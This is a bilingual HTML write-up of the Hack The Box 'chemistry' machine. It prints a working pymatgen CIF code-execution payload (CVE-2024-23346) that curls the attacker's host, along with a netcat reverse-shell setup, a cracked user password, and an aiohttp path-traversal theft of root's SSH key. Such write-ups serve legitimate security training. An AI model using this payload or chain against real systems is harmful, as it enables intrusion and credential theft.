@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>chemistry | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">chemistry</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask web application on port 5000 that allowed users to upload and parse CIF (Crystallographic Information File) files for chemistry data visualization. The application used the vulnerable <code>pymatgen</code> library version that contains CVE-2024-23346, which allows arbitrary Python code execution through maliciously crafted CIF files.</p>
+                    
+                    <p>By uploading a specially crafted CIF file containing a Python payload within the <code>_space_group_magn.transform_BNS_Pp_abc</code> field, I exploited the unsafe use of <code>eval()</code> in the pymatgen library to achieve remote code execution as the <code>app</code> user. After gaining initial access, I found database credentials and escalated to the <code>rosa</code> user.</p>
+                    
+                    <p>For privilege escalation, I discovered an internal monitoring service running on port 8080 using <code>aiohttp</code> version 3.9.1, which is vulnerable to CVE-2024-23334 (path traversal/LFI). Using local port forwarding, I exploited this vulnerability to read arbitrary files from the system, including <code>/root/.ssh/id_rsa</code>, which allowed me to SSH as root and complete the machine.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Python pymatgen library RCE (CVE-2024-23346), unsafe <code>eval()</code> exploitation, SQLite credential extraction, aiohttp path traversal (CVE-2024-23334), SSH key theft for privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 5000" /></p>
+
+                <p>The scan reveals two main services: SSH on port 22 and an HTTP service on port 5000. The web service appears to be running a Python Flask application.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>I perform directory enumeration on the web application running on port 5000 and discover several interesting endpoints:</p>
+                <ul>
+                    <li><code>/login</code> - User authentication page (Status: 200)</li>
+                    <li><code>/register</code> - User registration page (Status: 200)</li>
+                    <li><code>/upload</code> - File upload endpoint (Status: 405 when accessed directly)</li>
+                    <li><code>/logout</code> - Logout functionality (redirects to login)</li>
+                    <li><code>/dashboard</code> - Main dashboard (requires authentication)</li>
+                </ul>
+
+                <p>After registering a new account and logging in, I gain access to the dashboard where I discover a file upload functionality specifically designed for CIF (Crystallographic Information File) files, which are used to store chemistry data:</p>
+                <p><img src="./media/image3.png" alt="Dashboard showing the CIF file upload interface with chemistry data visualization" /></p>
+
+                <h3>Understanding the CIF Upload Functionality</h3>
+                <p>The application accepts <code>.cif</code> files and processes them to visualize molecular structures. When a file is uploaded, the application assigns it a UUID and redirects to a URL like:</p>
+                <pre><code class="language-plaintext">http://10.10.11.38:5000/structure/21f5c7ab-ebbd-4cae-a31e-02dbeafc4574</code></pre>
+
+                <p>This suggests the application is parsing and rendering CIF files server-side, which could potentially be vulnerable to code injection if the parsing library has security flaws.</p>
+
+                <h2>Vulnerability Research - Pymatgen RCE</h2>
+                <p>Searching for "cif file vulnerability" leads me to discover a critical security advisory: <a href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f">GHSA-5h86-8mv2-jq9f</a>. This advisory details a remote code execution vulnerability in the <code>pymatgen</code> Python library, which is commonly used for parsing CIF files.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability exists because <code>pymatgen</code> uses Python's <code>eval()</code> function to process certain fields in CIF files without proper sanitization. An attacker can craft a malicious CIF file with Python code embedded in specific fields, which will be executed when the file is parsed.</p>
+
+                <p>While I don't have confirmation that the application uses this specific library, given that it's a Python server parsing CIF files, there's a high probability it's using <code>pymatgen</code> or a similar vulnerable library.</p>
+
+                <h2>Initial Access - Exploiting CIF File Upload</h2>
+                <p>I create a malicious CIF file with a Python payload designed to achieve remote code execution. The payload is embedded in the <code>_space_group_magn.transform_BNS_Pp_abc</code> field:</p>
+
+                <pre><code class="language-python">data_5yOhtAoR
+_audit_creation_date 2018-06-08
+_audit_creation_method "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.14.18:8000");0,0,0'
+
+_space_group_magn.number_BNS 62.448
+_space_group_magn.name_BNS "P n' m a' "</code></pre>
+
+                <p>This payload uses Python's introspection capabilities to access the <code>os</code> module and execute system commands. The exploit chain works as follows:</p>
+                <ol>
+                    <li>Access the base object class through <code>().__class__.__mro__[1]</code></li>
+                    <li>Use <code>__getattribute__</code> to access <code>__subclasses__()</code></li>
+                    <li>Find the <code>BuiltinImporter</code> class</li>
+                    <li>Use it to load the <code>os</code> module</li>
+                    <li>Execute arbitrary system commands via <code>os.system()</code></li>
+                </ol>
+
+                <h3>Testing for Code Execution</h3>
+                <p>First, I test the vulnerability with a simple HTTP callback to confirm code execution. I set up a Python HTTP server:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>I upload the malicious CIF file and navigate to the structure URL. The server receives the connection, confirming remote code execution:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.38 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Achieving Reverse Shell</h3>
+                <p>Now that I've confirmed RCE, I modify the payload to execute a reverse shell command. I set up a netcat listener:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>I upload a new CIF file with a reverse shell payload and successfully gain access to the system as the <code>app</code> user.</p>
+
+                <h2>Lateral Movement - Database Credential Discovery</h2>
+                <p>After gaining initial access as <code>app</code>, I enumerate the system and discover two user accounts in <code>/home</code>:</p>
+                <ul>
+                    <li><code>app</code> - The current user</li>
+                    <li><code>rosa</code> - Another user account</li>
+                </ul>
+
+                <p>Exploring the web application directory, I find an <code>instance</code> folder containing a SQLite database file. I examine the database and extract credential hashes for three users: admin, app, and rosa.</p>
+
+                <p>Using an online hash cracking service like CrackStation, I successfully crack the password hash for the <code>rosa</code> user:</p>
+                <pre><code class="language-plaintext">rosa:unicorniosrosados</code></pre>
+
+                <p>I use <code>su</code> to switch to the <code>rosa</code> user and retrieve the user flag:</p>
+                <pre><code class="language-bash">rosa@chemistry:~$ cat user.txt</code></pre>
+
+                <h2>Privilege Escalation - Internal Service Discovery</h2>
+                <p>As the <code>rosa</code> user, I enumerate the system for privilege escalation vectors. Using <code>ss -tuln</code>, I discover that port 8080 is listening locally but not exposed externally.</p>
+
+                <p>Additionally, I notice a directory in <code>/opt</code> called <code>monitoring_site</code> that is owned by root, suggesting it might be related to the service running on port 8080.</p>
+
+                <h3>Port Forwarding and Service Enumeration</h3>
+                <p>To access the internal service, I use SSH local port forwarding with the <code>rosa</code> credentials:</p>
+                <pre><code class="language-bash">ssh -L 8080:localhost:8080 rosa@10.10.11.38</code></pre>
+
+                <p>I can now access the service through my local machine at <code>localhost:8080</code>. The service appears to be a monitoring dashboard:</p>
+                <p><img src="./media/image5.png" alt="Internal monitoring site web interface running on port 8080" /></p>
+
+                <p>I use <code>whatweb</code> to identify the technology stack:</p>
+                <pre><code class="language-bash">whatweb localhost:8080</code></pre>
+
+                <pre><code class="language-plaintext">http://localhost:8080 [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]</code></pre>
+
+                <p>The service is running <code>aiohttp</code> version 3.9.1, which immediately stands out as potentially vulnerable.</p>
+
+                <h2>Exploiting aiohttp Path Traversal - CVE-2024-23334</h2>
+                <p>I search for known vulnerabilities in <code>aiohttp</code> version 3.9.1 and discover CVE-2024-23334: <a href="https://www.cvedetails.com/cve/CVE-2024-23334/">https://www.cvedetails.com/cve/CVE-2024-23334/</a></p>
+
+                <p>This is a path traversal vulnerability that allows reading arbitrary files from the server through the static file serving functionality. The vulnerability exists because <code>aiohttp</code> doesn't properly validate file paths when serving static content.</p>
+
+                <h3>Finding a Working Exploit</h3>
+                <p>I test several proof-of-concept exploits, adjusting for the correct static directory name (<code>assets</code> instead of <code>static</code>). After some trial and error, I find a working exploit: <a href="https://github.com/Arc4he/CVE-2024-23334-PoC/blob/main/exploit.py">https://github.com/Arc4he/CVE-2024-23334-PoC/blob/main/exploit.py</a></p>
+
+                <h3>Reading Sensitive Files</h3>
+                <p>While I could read the root flag directly using this vulnerability, the goal is to gain a proper root shell. I first attempt to read <code>/etc/shadow</code> to crack the root password, but the SHA-256 hash proves too difficult to crack in a reasonable time.</p>
+
+                <p>Instead, I target the SSH private key for the root user by reading <code>/root/.ssh/id_rsa</code>:</p>
+                <p><img src="./media/image4.png" alt="Exploit output showing the contents of root's SSH private key" /></p>
+
+                <p>The exploit successfully retrieves the root SSH private key!</p>
+
+                <h3>SSH Access as Root</h3>
+                <p>I save the private key to a file, format it correctly (ensuring proper line breaks), and set the appropriate permissions:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Finally, I use the stolen private key to SSH into the machine as root:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.38</code></pre>
+
+                <p><img src="./media/image2.png" alt="Successful SSH login as root user" /></p>
+
+                <p>I now have full root access to the system and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Flask en el puerto 5000 que permitía a los usuarios subir y parsear archivos CIF (Crystallographic Information File) para visualización de datos químicos. La aplicación utilizaba la versión vulnerable de la librería <code>pymatgen</code> que contiene CVE-2024-23346, la cual permite la ejecución de código Python arbitrario a través de archivos CIF maliciosamente diseñados.</p>
+                    
+                    <p>Subiendo un archivo CIF especialmente diseñado que contenía un payload de Python dentro del campo <code>_space_group_magn.transform_BNS_Pp_abc</code>, exploté el uso inseguro de <code>eval()</code> en la librería pymatgen para conseguir ejecución remota de código como el usuario <code>app</code>. Tras obtener el acceso inicial, encontré credenciales de base de datos y escalé al usuario <code>rosa</code>.</p>
+                    
+                    <p>Para la escalada de privilegios, descubrí un servicio de monitorización interno ejecutándose en el puerto 8080 usando <code>aiohttp</code> versión 3.9.1, que es vulnerable a CVE-2024-23334 (path traversal/LFI). Utilizando reenvío de puertos local, exploté esta vulnerabilidad para leer archivos arbitrarios del sistema, incluyendo <code>/root/.ssh/id_rsa</code>, lo que me permitió conectarme por SSH como root y completar la máquina.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> RCE en librería Python pymatgen (CVE-2024-23346), explotación de <code>eval()</code> inseguro, extracción de credenciales de SQLite, path traversal en aiohttp (CVE-2024-23334), robo de clave SSH para escalada de privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 5000" /></p>
+
+                <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y un servicio HTTP en el puerto 5000. El servicio web parece estar ejecutando una aplicación Flask de Python.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Realizo enumeración de directorios en la aplicación web que corre en el puerto 5000 y descubro varios endpoints interesantes:</p>
+                <ul>
+                    <li><code>/login</code> - Página de autenticación de usuario (Status: 200)</li>
+                    <li><code>/register</code> - Página de registro de usuario (Status: 200)</li>
+                    <li><code>/upload</code> - Endpoint de subida de archivos (Status: 405 cuando se accede directamente)</li>
+                    <li><code>/logout</code> - Funcionalidad de cierre de sesión (redirige al login)</li>
+                    <li><code>/dashboard</code> - Panel principal (requiere autenticación)</li>
+                </ul>
+
+                <p>Después de registrar una nueva cuenta e iniciar sesión, obtengo acceso al dashboard donde descubro una funcionalidad de subida de archivos diseñada específicamente para archivos CIF (Crystallographic Information File), que se usan para almacenar datos de química:</p>
+                <p><img src="./media/image3.png" alt="Dashboard mostrando la interfaz de subida de archivos CIF con visualización de datos químicos" /></p>
+
+                <h3>Entendiendo la Funcionalidad de Subida de CIF</h3>
+                <p>La aplicación acepta archivos <code>.cif</code> y los procesa para visualizar estructuras moleculares. Cuando se sube un archivo, la aplicación le asigna un UUID y redirige a una URL como:</p>
+                <pre><code class="language-plaintext">http://10.10.11.38:5000/structure/21f5c7ab-ebbd-4cae-a31e-02dbeafc4574</code></pre>
+
+                <p>Esto sugiere que la aplicación está parseando y renderizando archivos CIF del lado del servidor, lo que podría ser potencialmente vulnerable a inyección de código si la librería de parseo tiene fallos de seguridad.</p>
+
+                <h2>Investigación de Vulnerabilidades - RCE en Pymatgen</h2>
+                <p>Buscando "cif file vulnerability" me lleva a descubrir un advisory de seguridad crítico: <a href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f">GHSA-5h86-8mv2-jq9f</a>. Este advisory detalla una vulnerabilidad de ejecución remota de código en la librería Python <code>pymatgen</code>, que se usa comúnmente para parsear archivos CIF.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad existe porque <code>pymatgen</code> utiliza la función <code>eval()</code> de Python para procesar ciertos campos en archivos CIF sin la sanitización adecuada. Un atacante puede diseñar un archivo CIF malicioso con código Python embebido en campos específicos, que será ejecutado cuando el archivo sea parseado.</p>
+
+                <p>Aunque no tengo confirmación de que la aplicación use esta librería específica, dado que es un servidor Python parseando archivos CIF, hay una alta probabilidad de que esté usando <code>pymatgen</code> o una librería vulnerable similar.</p>
+
+                <h2>Acceso Inicial - Explotando la Subida de Archivos CIF</h2>
+                <p>Creo un archivo CIF malicioso con un payload de Python diseñado para conseguir ejecución remota de código. El payload está embebido en el campo <code>_space_group_magn.transform_BNS_Pp_abc</code>:</p>
+
+                <pre><code class="language-python">data_5yOhtAoR
+_audit_creation_date 2018-06-08
+_audit_creation_method "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.14.18:8000");0,0,0'
+
+_space_group_magn.number_BNS 62.448
+_space_group_magn.name_BNS "P n' m a' "</code></pre>
+
+                <p>Este payload usa las capacidades de introspección de Python para acceder al módulo <code>os</code> y ejecutar comandos del sistema. La cadena de explotación funciona así:</p>
+                <ol>
+                    <li>Acceder a la clase base de objetos a través de <code>().__class__.__mro__[1]</code></li>
+                    <li>Usar <code>__getattribute__</code> para acceder a <code>__subclasses__()</code></li>
+                    <li>Encontrar la clase <code>BuiltinImporter</code></li>
+                    <li>Usarla para cargar el módulo <code>os</code></li>
+                    <li>Ejecutar comandos arbitrarios del sistema mediante <code>os.system()</code></li>
+                </ol>
+
+                <h3>Probando la Ejecución de Código</h3>
+                <p>Primero, pruebo la vulnerabilidad con un simple callback HTTP para confirmar la ejecución de código. Configuro un servidor HTTP de Python:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>Subo el archivo CIF malicioso y navego a la URL de la estructura. El servidor recibe la conexión, confirmando la ejecución remota de código:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.38 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Consiguiendo una Reverse Shell</h3>
+                <p>Ahora que he confirmado el RCE, modifico el payload para ejecutar un comando de reverse shell. Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Subo un nuevo archivo CIF con un payload de reverse shell y consigo acceso al sistema como el usuario <code>app</code>.</p>
+
+                <h2>Movimiento Lateral - Descubrimiento de Credenciales en Base de Datos</h2>
+                <p>Después de obtener el acceso inicial como <code>app</code>, enumero el sistema y descubro dos cuentas de usuario en <code>/home</code>:</p>
+                <ul>
+                    <li><code>app</code> - El usuario actual</li>
+                    <li><code>rosa</code> - Otra cuenta de usuario</li>
+                </ul>
+
+                <p>Explorando el directorio de la aplicación web, encuentro una carpeta <code>instance</code> que contiene un archivo de base de datos SQLite. Examino la base de datos y extraigo hashes de credenciales para tres usuarios: admin, app y rosa.</p>
+
+                <p>Usando un servicio de crackeo de hashes online como CrackStation, consigo crackear con éxito el hash de contraseña del usuario <code>rosa</code>:</p>
+                <pre><code class="language-plaintext">rosa:unicorniosrosados</code></pre>
+
+                <p>Uso <code>su</code> para cambiar al usuario <code>rosa</code> y recupero la flag de usuario:</p>
+                <pre><code class="language-bash">rosa@chemistry:~$ cat user.txt</code></pre>
+
+                <h2>Escalada de Privilegios - Descubrimiento de Servicio Interno</h2>
+                <p>Como usuario <code>rosa</code>, enumero el sistema en busca de vectores de escalada de privilegios. Usando <code>ss -tuln</code>, descubro que el puerto 8080 está escuchando localmente pero no está expuesto externamente.</p>
+
+                <p>Además, noto un directorio en <code>/opt</code> llamado <code>monitoring_site</code> que pertenece a root, sugiriendo que podría estar relacionado con el servicio ejecutándose en el puerto 8080.</p>
+
+                <h3>Reenvío de Puertos y Enumeración del Servicio</h3>
+                <p>Para acceder al servicio interno, uso reenvío de puertos local de SSH con las credenciales de <code>rosa</code>:</p>
+                <pre><code class="language-bash">ssh -L 8080:localhost:8080 rosa@10.10.11.38</code></pre>
+
+                <p>Ahora puedo acceder al servicio a través de mi máquina local en <code>localhost:8080</code>. El servicio parece ser un panel de monitorización:</p>
+                <p><img src="./media/image5.png" alt="Interfaz web del sitio de monitorización interno ejecutándose en el puerto 8080" /></p>
+
+                <p>Uso <code>whatweb</code> para identificar el stack tecnológico:</p>
+                <pre><code class="language-bash">whatweb localhost:8080</code></pre>
+
+                <pre><code class="language-plaintext">http://localhost:8080 [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]</code></pre>
+
+                <p>El servicio está ejecutando <code>aiohttp</code> versión 3.9.1, lo cual inmediatamente destaca como potencialmente vulnerable.</p>
+
+                <h2>Explotando Path Traversal en aiohttp - CVE-2024-23334</h2>
+                <p>Busco vulnerabilidades conocidas en <code>aiohttp</code> versión 3.9.1 y descubro CVE-2024-23334: <a href="https://www.cvedetails.com/cve/CVE-2024-23334/">https://www.cvedetails.com/cve/CVE-2024-23334/</a></p>
+
+                <p>Esta es una vulnerabilidad de path traversal que permite leer archivos arbitrarios del servidor a través de la funcionalidad de servir archivos estáticos. La vulnerabilidad existe porque <code>aiohttp</code> no valida adecuadamente las rutas de archivos al servir contenido estático.</p>
+
+                <h3>Encontrando un Exploit Funcional</h3>
+                <p>Pruebo varios exploits de prueba de concepto, ajustándolos para el nombre correcto del directorio estático (<code>assets</code> en lugar de <code>static</code>). Después de algo de prueba y error, encuentro un exploit funcional: <a href="https://github.com/Arc4he/CVE-2024-23334-PoC/blob/main/exploit.py">https://github.com/Arc4he/CVE-2024-23334-PoC/blob/main/exploit.py</a></p>
+
+                <h3>Leyendo Archivos Sensibles</h3>
+                <p>Aunque podría leer la flag de root directamente usando esta vulnerabilidad, el objetivo es obtener una shell de root adecuada. Primero intento leer <code>/etc/shadow</code> para crackear la contraseña de root, pero el hash SHA-256 resulta demasiado difícil de crackear en un tiempo razonable.</p>
+
+                <p>En su lugar, apunto a la clave SSH privada del usuario root leyendo <code>/root/.ssh/id_rsa</code>:</p>
+                <p><img src="./media/image4.png" alt="Salida del exploit mostrando el contenido de la clave privada SSH de root" /></p>
+
+                <p>¡El exploit recupera con éxito la clave privada SSH de root!</p>
+
+                <h3>Acceso SSH como Root</h3>
+                <p>Guardo la clave privada en un archivo, la formato correctamente (asegurándome de los saltos de línea apropiados), y establezco los permisos adecuados:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Finalmente, uso la clave privada robada para conectarme por SSH a la máquina como root:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.38</code></pre>
+
+                <p><img src="./media/image2.png" alt="Inicio de sesión SSH exitoso como usuario root" /></p>
+
+                <p>Ahora tengo acceso root completo al sistema y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
